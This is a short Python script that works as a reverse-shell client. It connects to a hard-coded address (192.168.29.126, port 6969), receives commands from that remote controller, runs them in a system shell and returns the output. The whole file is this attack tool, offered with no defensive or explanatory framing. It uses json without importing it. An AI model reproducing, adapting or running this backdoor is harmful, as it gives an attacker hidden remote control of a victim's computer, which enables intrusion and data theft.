#!/usr/bin/python
import socket
import subprocess


def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv():  
        json_data = ""
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue


def shell():
        while True:
                command = reliable_recv()
                                                ##message = bytes(message,'utf-8')
                                                #print(message)
                if command =='q':
                        break

                else:
                        try:

                                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                result = proc.stdout.read() + proc.stderr.read()
                                reliable_send(result)
                        except:
                                reliable_send("[!!] can't exceute the command")

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(("192.168.29.126",6969))
print("Connection established to server")
shell()
sock.close()
